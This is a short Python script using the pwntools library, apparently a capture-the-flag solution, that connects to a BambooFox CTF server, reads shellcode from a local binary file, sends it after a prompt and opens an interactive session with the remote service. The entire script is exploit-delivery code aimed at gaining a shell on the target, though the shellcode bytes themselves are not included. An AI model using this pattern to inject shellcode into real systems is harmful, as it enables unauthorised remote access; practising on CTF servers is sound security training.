#!/usr/bin/env python

from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw', 11101)

with open('./test64.bin', 'rb') as fd:
    shellcode = fd.read()

r.recvuntil(':')
r.send(shellcode)

r.interactive()
